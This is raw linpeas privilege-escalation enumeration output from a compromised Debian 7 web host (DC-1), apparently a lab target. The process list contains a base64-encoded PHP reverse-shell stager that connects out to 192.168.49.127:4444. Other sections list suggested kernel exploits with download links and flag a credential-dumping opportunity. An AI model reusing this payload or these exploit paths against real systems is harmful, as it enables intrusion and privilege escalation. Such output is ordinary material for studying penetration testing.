

╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
╚═══════════════════╝
OS: Linux version 3\.2\.0\-6\-486 \(debian\-kernel@lists\.debian\.org\) \(gcc version 4\.9\.2 \(Debian 4\.9\.2\-10\+deb7u1\) \) #1 Debian 3\.2\.102\-1
User \& Groups: uid=33\(www\-data\) gid=33\(www\-data\) groups=33\(www\-data\)
Hostname: DC\-1
Writable folder: /run/shm
\[\+\] /bin/ping is available for network discovery \(linpeas can discover hosts, learn more with \-h\)
\[\+\] /bin/nc is available for network discover \& port scanning \(linpeas can discover hosts and scan ports, learn more with \-h\)


Caching directories DONE

╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
╚════════════════════╝
╔══════════╣ Operative system
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits)

Linux version 3\.2\.0\-6\-486 \(debian\-kernel@lists\.debian\.org\) \(gcc version 4\.9\.2 \(Debian 4\.9\.2\-10\+deb7u1\) \) #1 Debian 3\.2\.102\-1
Distributor ID:	Debian
Description:	Debian GNU/Linux 7\.11 \(wheezy\)
Release:	7\.11
Codename:	wheezy

╔══════════╣ Sudo version
sudo Not Found

╔══════════╣ CVEs Check


╔══════════╣ PATH
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses)

/usr/local/bin:/usr/bin:/bin
New path exported: /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin

╔══════════╣ Date \& uptime
Mon Apr 11 05:07:55 AEST 2022
05:07:55 up  1:37,  0 users,  load average: 9\.03, 8\.79, 9\.81

╔══════════╣ Any sd\*/disk\* disk in /dev? \(limit 20\)
disk
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file\-system?
╚ Check if you can mount unmounted devices
UUID=98efd4b5\-ef7d\-4335\-96c0\-01fdf0f4a43b /               ext4    errors=remount\-ro 0       1
UUID=8834809a\-d2ca\-4922\-acee\-b9fd20a5fd74 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
OLDPWD=/tmp
APACHE\_RUN\_DIR=/var/run/apache2
APACHE\_PID\_FILE=/var/run/apache2\.pid
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin
APACHE\_LOCK\_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE\_RUN\_USER=www\-data
APACHE\_RUN\_GROUP=www\-data
APACHE\_LOG\_DIR=/var/log/apache2
PWD=/tmp/\.a
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed)

dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ [https://github.com/mzet-/linux-exploit-suggester](#https://github.com/mzet-/linux-exploit-suggester)

\[\+\] \[CVE\-2016\-5195\] dirtycow

Details: [https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails](#https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails)

Exposure: highly probable
Tags: \[ debian=7|8 \],RHEL=5\{kernel:2\.6\.\(18|24|33\)\-\*\},RHEL=6\{kernel:2\.6\.32\-\*|3\.\(0|2|6|8|10\)\.\*|2\.6\.33\.9\-rt31\},RHEL=7\{kernel:3\.10\.0\-\*|4\.2\.0\-0\.21\.el7\},ubuntu=16\.04|14\.04|12\.04
Download URL: [https://www.exploit-db.com/download/40611](#https://www.exploit-db.com/download/40611)

Comments: For RHEL/CentOS see exact vulnerable versions here: [https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh](#https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh)


\[\+\] \[CVE\-2016\-5195\] dirtycow 2

Details: [https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails](#https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails)

Exposure: highly probable
Tags: \[ debian=7|8 \],RHEL=5|6|7,ubuntu=14\.04|12\.04,ubuntu=10\.04\{kernel:2\.6\.32\-21\-generic\},ubuntu=16\.04\{kernel:4\.4\.0\-21\-generic\}
Download URL: [https://www.exploit-db.com/download/40839](#https://www.exploit-db.com/download/40839)

ext\-url: [https://www.exploit-db.com/download/40847](#https://www.exploit-db.com/download/40847)

Comments: For RHEL/CentOS see exact vulnerable versions here: [https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh](#https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh)


\[\+\] \[CVE\-2021\-22555\] Netfilter heap out\-of\-bounds write

Details: [https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html](#https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)

Exposure: less probable
Tags: ubuntu=20\.04\{kernel:5\.8\.0\-\*\}
Download URL: [https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c](#https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c)

ext\-url: [https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c](#https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c)

Comments: ip\_tables kernel module must be loaded

\[\+\] \[CVE\-2019\-15666\] XFRM\_UAF

Details: [https://duasynt.com/blog/ubuntu-centos-redhat-privesc](#https://duasynt.com/blog/ubuntu-centos-redhat-privesc)

Exposure: less probable
Download URL: 
Comments: CONFIG\_USER\_NS needs to be enabled; CONFIG\_XFRM needs to be enabled

\[\+\] \[CVE\-2017\-7308\] af\_packet

Details: [https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html](#https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html)

Exposure: less probable
Tags: ubuntu=16\.04\{kernel:4\.8\.0\-\(34|36|39|41|42|44|45\)\-generic\}
Download URL: [https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c](#https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c)

ext\-url: [https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c](#https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c)

Comments: CAP\_NET\_RAW cap or CONFIG\_USER\_NS=y needed\. Modified version at 'ext\-url' adds support for additional kernels

\[\+\] \[CVE\-2017\-6074\] dccp

Details: [http://www.openwall.com/lists/oss-security/2017/02/22/3](#http://www.openwall.com/lists/oss-security/2017/02/22/3)

Exposure: less probable
Tags: ubuntu=\(14\.04|16\.04\)\{kernel:4\.4\.0\-62\-generic\}
Download URL: [https://www.exploit-db.com/download/41458](#https://www.exploit-db.com/download/41458)

Comments: Requires Kernel be built with CONFIG\_IP\_DCCP enabled\. Includes partial SMEP/SMAP bypass

\[\+\] \[CVE\-2016\-2384\] usb\-midi

Details: [https://xairy.github.io/blog/2016/cve-2016-2384](#https://xairy.github.io/blog/2016/cve-2016-2384)

Exposure: less probable
Tags: ubuntu=14\.04,fedora=22
Download URL: [https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c](#https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c)

Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non\-privileged user

\[\+\] \[CVE\-2015\-8660\] overlayfs \(ovl\_setattr\)

Details: [http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/](#http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/)

Exposure: less probable
Tags: ubuntu=\(14\.04|15\.10\)\{kernel:4\.2\.0\-\(18|19|20|21|22\)\-generic\}
Download URL: [https://www.exploit-db.com/download/39166](#https://www.exploit-db.com/download/39166)


\[\+\] \[CVE\-2015\-8660\] overlayfs \(ovl\_setattr\)

Details: [http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/](#http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/)

Exposure: less probable
Download URL: [https://www.exploit-db.com/download/39230](#https://www.exploit-db.com/download/39230)


\[\+\] \[CVE\-2014\-5207\] fuse\_suid

Details: [https://www.exploit-db.com/exploits/34923/](#https://www.exploit-db.com/exploits/34923/)

Exposure: less probable
Download URL: [https://www.exploit-db.com/download/34923](#https://www.exploit-db.com/download/34923)


\[\+\] \[CVE\-2014\-4699\] ptrace/sysret

Details: [http://www.openwall.com/lists/oss-security/2014/07/08/16](#http://www.openwall.com/lists/oss-security/2014/07/08/16)

Exposure: less probable
Tags: ubuntu=12\.04
Download URL: [https://www.exploit-db.com/download/34134](#https://www.exploit-db.com/download/34134)


\[\+\] \[CVE\-2014\-4014\] inode\_capable

Details: [http://www.openwall.com/lists/oss-security/2014/06/10/4](#http://www.openwall.com/lists/oss-security/2014/06/10/4)

Exposure: less probable
Tags: ubuntu=12\.04
Download URL: [https://www.exploit-db.com/download/33824](#https://www.exploit-db.com/download/33824)


\[\+\] \[CVE\-2014\-0196\] rawmodePTY

Details: [http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html](#http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html)

Exposure: less probable
Download URL: [https://www.exploit-db.com/download/33516](#https://www.exploit-db.com/download/33516)


\[\+\] \[CVE\-2013\-2094\] semtex

Details: [http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/](#http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/)

Exposure: less probable
Tags: RHEL=6
Download URL: [https://www.exploit-db.com/download/25444](#https://www.exploit-db.com/download/25444)


\[\+\] \[CVE\-2013\-1959\] userns\_root\_sploit

Details: [http://www.openwall.com/lists/oss-security/2013/04/29/1](#http://www.openwall.com/lists/oss-security/2013/04/29/1)

Exposure: less probable
Download URL: [https://www.exploit-db.com/download/25450](#https://www.exploit-db.com/download/25450)


\[\+\] \[CVE\-2013\-0268\] msr

Details: [https://www.exploit-db.com/exploits/27297/](#https://www.exploit-db.com/exploits/27297/)

Exposure: less probable
Download URL: [https://www.exploit-db.com/download/27297](#https://www.exploit-db.com/download/27297)



╔══════════╣ Executing Linux Exploit Suggester 2
╚ [https://github.com/jondonas/linux-exploit-suggester-2](#https://github.com/jondonas/linux-exploit-suggester-2)

\[1\] dirty\_cow
CVE\-2016\-5195
Source: [http://www.exploit-db.com/exploits/40616](#http://www.exploit-db.com/exploits/40616)

\[2\] exploit\_x
CVE\-2018\-14665
Source: [http://www.exploit-db.com/exploits/45697](#http://www.exploit-db.com/exploits/45697)

\[3\] msr
CVE\-2013\-0268
Source: [http://www.exploit-db.com/exploits/27297](#http://www.exploit-db.com/exploits/27297)

\[4\] perf\_swevent
CVE\-2013\-2094
Source: [http://www.exploit-db.com/exploits/26131](#http://www.exploit-db.com/exploits/26131)



╔══════════╣ Protections
═╣ AppArmor enabled? \.\.\.\.\.\.\.\.\.\.\.\.\.\. AppArmor Not Found
═╣ grsecurity present? \.\.\.\.\.\.\.\.\.\.\.\. grsecurity Not Found
═╣ PaX bins present? \.\.\.\.\.\.\.\.\.\.\.\.\.\. PaX Not Found
═╣ Execshield enabled? \.\.\.\.\.\.\.\.\.\.\.\. Execshield Not Found
═╣ SELinux enabled? \.\.\.\.\.\.\.\.\.\.\.\.\.\.\. SELinux status:                 disabled
═╣ Is ASLR enabled? \.\.\.\.\.\.\.\.\.\.\.\.\.\.\. Yes
═╣ Printer? \.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\. No
═╣ Is this a virtual machine? \.\.\.\.\. Yes

╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════
╚═══════════╝
╔══════════╣ Container related tools present
╔══════════╣ Container details
═╣ Is this a container? \.\.\.\.\.\.\.\.\.\.\. No
═╣ Any running containers? \.\.\.\.\.\.\.\. No


╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird \& unexpected proceses run by root: [https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes)

root       345  0\.0  0\.0   2792     8 ?        Ss   03:30   0:00 udevd \-\-daemon\[0m
root      1766  0\.0  0\.0   2788     8 ?        S    03:31   0:00  \_ udevd \-\-daemon\[0m
root      1730  0\.0  0\.0   2444    92 ?        Ss   03:31   0:00 /sbin/rpcbind \-w
statd     1761  0\.0  0\.0   2704   448 ?        Ss   03:31   0:00 /sbin/rpc\.statd
root      1776  0\.0  0\.0   2592     8 ?        Ss   03:31   0:00 /usr/sbin/rpc\.idmapd
root      2107  0\.0  0\.1  28220  1084 ?        Sl   03:31   0:00 /usr/sbin/rsyslogd \-c5
root      2154  0\.0  0\.1  28236  1372 ?        S    03:31   0:02 /usr/bin/vmtoolsd
root      2163  0\.0  0\.0   1892     8 ?        Ss   03:31   0:00 /usr/sbin/acpid
root      2199  0\.0  0\.1  43708  1604 ?        Ss   03:31   0:00 /usr/sbin/apache2 \-k start
www\-data  3784  4\.4  1\.1  47784 11388 ?        S    03:47   3:32  \_ /usr/sbin/apache2 \-k start
www\-data  3824  4\.2  1\.4  51068 14788 ?        S    03:47   3:25  \_ /usr/sbin/apache2 \-k start
www\-data  4128  4\.2  1\.1  47448 11476 ?        S    03:53   3:07  \_ /usr/sbin/apache2 \-k start
www\-data  4144  3\.8  1\.1  47796 11856 ?        S    03:54   2:52  \_ /usr/sbin/apache2 \-k start
www\-data  4345  4\.1  1\.4  51040 15108 ?        S    03:55   3:02  \_ /usr/sbin/apache2 \-k start
www\-data  6300  4\.2  1\.1  47444 11456 ?        S    04:10   2:25  \_ /usr/sbin/apache2 \-k start
www\-data  6311  4\.2  1\.1  47752 11744 ?        S    04:10   2:28  \_ /usr/sbin/apache2 \-k start
www\-data  6368  4\.1  1\.1  47444 11460 ?        S    04:12   2:15  \_ /usr/sbin/apache2 \-k start
www\-data  6378  4\.5  1\.1  47752 11752 ?        S    04:12   2:29  \_ /usr/sbin/apache2 \-k start
www\-data  6391  4\.3  1\.1  47448 11476 ?        S    04:12   2:23  \_ /usr/sbin/apache2 \-k start
www\-data  6393  4\.3  1\.1  47752 11740 ?        S    04:12   2:24  \_ /usr/sbin/apache2 \-k start
www\-data  6398  4\.1  1\.1  47444 11440 ?        S    04:12   2:18  \_ /usr/sbin/apache2 \-k start
www\-data  6399  4\.3  1\.1  47444 11408 ?        S    04:12   2:23  \_ /usr/sbin/apache2 \-k start
www\-data  6404  4\.8  1\.1  47444 11420 ?        S    04:12   2:42  \_ /usr/sbin/apache2 \-k start
www\-data  6405  4\.2  1\.1  47780 12168 ?        S    04:12   2:21  \_ /usr/sbin/apache2 \-k start
www\-data  6447  4\.2  1\.1  47760 11752 ?        S    04:12   2:19  \_ /usr/sbin/apache2 \-k start
www\-data  6448  4\.0  1\.4  51028 15024 ?        S    04:12   2:15  \_ /usr/sbin/apache2 \-k start
www\-data  8971  5\.3  0\.9  45896  9820 ?        S    04:33   1:52  \_ /usr/sbin/apache2 \-k start
www\-data  8973  0\.4  1\.4  51636 15216 ?        S    04:33   0:08  \_ /usr/sbin/apache2 \-k start
www\-data  8999  0\.0  0\.0   1948   540 ?        S    04:35   0:00  |   \_ sh \-c php \-r 'eval\(base64\_decode\(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguNDkuMTI3JzsgJHBvcnQgPSA0NDQ0OyBpZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwgJHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRpZSgnbm8gc29ja2V0IGZ1bmNzJyk7IH0gaWYgKCEkcykgeyBkaWUoJ25vIHNvY2tldCcpOyB9IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7IH0gaWYgKCEkbGVuKSB7IGRpZSgpOyB9ICRhID0gdW5wYWNr\.KCJObGVuIiwgJGxlbik7ICRsZW4gPSAkYVsnbGVuJ107ICRiID0gJyc7IHdoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgeyBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkYiAuPSBzb2NrZXRfcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IH0gfSAkR0xPQkFMU1snbXNnc29jayddID0gJHM7ICRHTE9CQUxTWydtc2dzb2NrX3R5cGUnXSA9ICRzX3R5cGU7IGlmIChleHRlbnNpb25fbG9hZGVkKCdzdWhvc2luJykgJiYgaW5pX2dldCgnc3Vob3Npbi5leGVjdXRvci5kaXNhYmxlX2V2YWwnKSkgeyAkc3Vob3Npbl9ieXBhc3M9Y3JlYXRlX2Z1bmN0aW9uKCcnLCAkYik7ICRzdWhvc2luX2J5cGFzcygpOyB9IGVsc2UgeyBldmFsKCRiKTsgfSBkaWUoKTs\)\);'
www\-data  9000  0\.0  0\.8  41032  9068 ?        S    04:35   0:00  |       \_ php \-r eval\(base64\_decode\(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguNDkuMTI3JzsgJHBvcnQgPSA0NDQ0OyBpZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwgJHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRpZSgnbm8gc29ja2V0IGZ1bmNzJyk7IH0gaWYgKCEkcykgeyBkaWUoJ25vIHNvY2tldCcpOyB9IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7IH0gaWYgKCEkbGVuKSB7IGRpZSgpOyB9ICRhID0gdW5wYWNr\.KCJObGVuIiwgJGxlbik7ICRsZW4gPSAkYVsnbGVuJ107ICRiID0gJyc7IHdoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgeyBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkYiAuPSBzb2NrZXRfcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IH0gfSAkR0xPQkFMU1snbXNnc29jayddID0gJHM7ICRHTE9CQUxTWydtc2dzb2NrX3R5cGUnXSA9ICRzX3R5cGU7IGlmIChleHRlbnNpb25fbG9hZGVkKCdzdWhvc2luJykgJiYgaW5pX2dldCgnc3Vob3Npbi5leGVjdXRvci5kaXNhYmxlX2V2YWwnKSkgeyAkc3Vob3Npbl9ieXBhc3M9Y3JlYXRlX2Z1bmN0aW9uKCcnLCAkYik7ICRzdWhvc2luX2J5cGFzcygpOyB9IGVsc2UgeyBldmFsKCRiKTsgfSBkaWUoKTs\)\);
www\-data  9005  0\.0  0\.0   1948   516 ?        S    04:36   0:00  |           \_ sh \-c /bin/sh 
www\-data  9006  0\.0  0\.0   1948   548 ?        S    04:36   0:00  |               \_ /bin/sh
www\-data  9257  0\.0  0\.1   2612  1348 ?        S    05:07   0:00  |                   \_ /bin/sh \./linpeas\.sh all
www\-data 12534  0\.0  0\.0   2612  1016 ?        S    05:07   0:00  |                       \_ /bin/sh \./linpeas\.sh all
www\-data 12538  0\.0  0\.0   2828  1032 ?        R    05:07   0:00  |                       |   \_ ps fauxwww
www\-data 12537  0\.0  0\.0   2612  1008 ?        S    05:07   0:00  |                       \_ /bin/sh \./linpeas\.sh all
www\-data  9021  5\.3  1\.0  47436 11344 ?        S    04:37   1:36  \_ /usr/sbin/apache2 \-k start
daemon\[0m    2237  0\.0  0\.0   2168    56 ?        Ss   03:31   0:00 /usr/sbin/atd
root      2273  0\.0  0\.0   3852   248 ?        Ss   03:31   0:00 /usr/sbin/cron
103       2303  0\.0  0\.0   3032     8 ?        Ss   03:31   0:00 /usr/bin/dbus\-daemon\[0m \-\-system
root      2358  0\.0  0\.0   1948   312 ?        S    03:31   0:00 /bin/sh /usr/bin/mysqld\_safe
mysql     3978  0\.9  7\.1 342188 73960 ?        Sl   03:47   0:46  \_ /usr/sbin/mysqld \-\-basedir=/usr \-\-datadir=/var/lib/mysql \-\-plugin\-dir=/usr/lib/mysql/plugin \-\-user=mysql \-\-pid\-file=/var/run/mysqld/mysqld\.pid \-\-socket=/var/run/mysqld/mysqld\.sock \-\-port=3306
root      3979  0\.0  0\.0   1868   596 ?        S    03:47   0:00  \_ logger \-t mysqld \-p daemon\[0m\.error
101       3086  0\.0  0\.0   7424   144 ?        Ss   03:31   0:00 /usr/sbin/exim4 \-bd \-q30m
root      3136  0\.0  0\.0   3796     8 tty1     Ss\+  03:31   0:00 /sbin/getty 38400 tty1
root      3137  0\.0  0\.0   3796     8 tty2     Ss\+  03:31   0:00 /sbin/getty 38400 tty2
root      3138  0\.0  0\.0   3796     8 tty3     Ss\+  03:31   0:00 /sbin/getty 38400 tty3
root      3139  0\.0  0\.0   3796     8 tty4     Ss\+  03:31   0:00 /sbin/getty 38400 tty4
root      3140  0\.0  0\.0   3796     8 tty5     Ss\+  03:31   0:00 /sbin/getty 38400 tty5
root      3141  0\.0  0\.0   3796     8 tty6     Ss\+  03:31   0:00 /sbin/getty 38400 tty6
root      3322  0\.0  0\.0   6496     8 ?        Ss   03:33   0:00 /usr/sbin/sshd

╔══════════╣ Binary processes permissions \(non 'root root' and not belonging to current user\)
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes)


╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND     PID   TID        USER   FD      TYPE     DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory \(root req\)
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory)

gdm\-password Not Found
gnome\-keyring\-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found \(dump creds from memory as root\)
sshd Not Found

╔══════════╣ Cron jobs
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs)

/usr/bin/crontab
incrontab Not Found
\-rw\-r\-\-r\-\- 1 root root     722 Jul  4  2012 /etc/crontab

/etc/cron\.d:
total 16
drwxr\-xr\-x  2 root root 4096 Feb 19  2019 \.
drwxr\-xr\-x 86 root root 4096 Mar 30 00:32 \.\.
\-rw\-r\-\-r\-\-  1 root root  102 Jul  4  2012 \.placeholder
\-rw\-r\-\-r\-\-  1 root root  510 May 10  2018 php5

/etc/cron\.daily:
total 68
drwxr\-xr\-x  2 root root  4096 Feb 19  2019 \.
drwxr\-xr\-x 86 root root  4096 Mar 30 00:32 \.\.
\-rw\-r\-\-r\-\-  1 root root   102 Jul  4  2012 \.placeholder
\-rwxr\-xr\-x  1 root root   633 May 30  2018 apache2
\-rwxr\-xr\-x  1 root root 14985 Oct 24  2014 apt
\-rwxr\-xr\-x  1 root root   314 Nov  5  2012 aptitude
\-rwxr\-xr\-x  1 root root   355 Jun 11  2012 bsdmainutils
\-rwxr\-xr\-x  1 root root   256 May  3  2016 dpkg
\-rwxr\-xr\-x  1 root root  4125 Feb 11  2018 exim4\-base
\-rwxr\-xr\-x  1 root root    89 May 17  2012 logrotate
\-rwxr\-xr\-x  1 root root  1365 Jun 19  2012 man\-db
\-rwxr\-xr\-x  1 root root   606 Sep 25  2010 mlocate
\-rwxr\-xr\-x  1 root root   249 May 26  2012 passwd

/etc/cron\.hourly:
total 12
drwxr\-xr\-x  2 root root 4096 Feb 19  2019 \.
drwxr\-xr\-x 86 root root 4096 Mar 30 00:32 \.\.
\-rw\-r\-\-r\-\-  1 root root  102 Jul  4  2012 \.placeholder

/etc/cron\.monthly:
total 12
drwxr\-xr\-x  2 root root 4096 Feb 19  2019 \.
drwxr\-xr\-x 86 root root 4096 Mar 30 00:32 \.\.
\-rw\-r\-\-r\-\-  1 root root  102 Jul  4  2012 \.placeholder

/etc/cron\.weekly:
total 16
drwxr\-xr\-x  2 root root 4096 Feb 19  2019 \.
drwxr\-xr\-x 86 root root 4096 Mar 30 00:32 \.\.
\-rw\-r\-\-r\-\-  1 root root  102 Jul  4  2012 \.placeholder
\-rwxr\-xr\-x  1 root root  907 Jun 19  2012 man\-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 \*	\* \* \*	root    cd / \&\& run\-parts \-\-report /etc/cron\.hourly
25 6	\* \* \*	root	test \-x /usr/sbin/anacron || \( cd / \&\& run\-parts \-\-report /etc/cron\.daily \)
47 6	\* \* 7	root	test \-x /usr/sbin/anacron || \( cd / \&\& run\-parts \-\-report /etc/cron\.weekly \)
52 6	1 \* \*	root	test \-x /usr/sbin/anacron || \( cd / \&\& run\-parts \-\-report /etc/cron\.monthly \)

╔══════════╣ Systemd PATH
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths)


╔══════════╣ Analyzing \.service files
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#services](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#services)

You can't write on systemd PATH

╔══════════╣ System timers
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers)


╔══════════╣ Analyzing \.timer files
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers)


╔══════════╣ Analyzing \.socket files
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets)

/lib/systemd/system/dbus\.socket is calling this writable listener: /var/run/dbus/system\_bus\_socket
/lib/systemd/system/dbus\.target\.wants/dbus\.socket is calling this writable listener: /var/run/dbus/system\_bus\_socket
/lib/systemd/system/sockets\.target\.wants/dbus\.socket is calling this writable listener: /var/run/dbus/system\_bus\_socket

╔══════════╣ Unix Sockets Listening
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets)

/dev/log
└─\(Read Write\)
/run/acpid\.socket
└─\(Read Write\)
/run/dbus/system\_bus\_socket
└─\(Read Write\)
/run/mysqld/mysqld\.sock
└─\(Read Write\)
/run/rpcbind\.sock
└─\(Read Write\)
/run/udev/control
└─\(Read \)
/var/run/acpid\.socket
└─\(Read Write\)
/var/run/dbus/system\_bus\_socket
└─\(Read Write\)
/var/run/mysqld/mysqld\.sock
└─\(Read Write\)
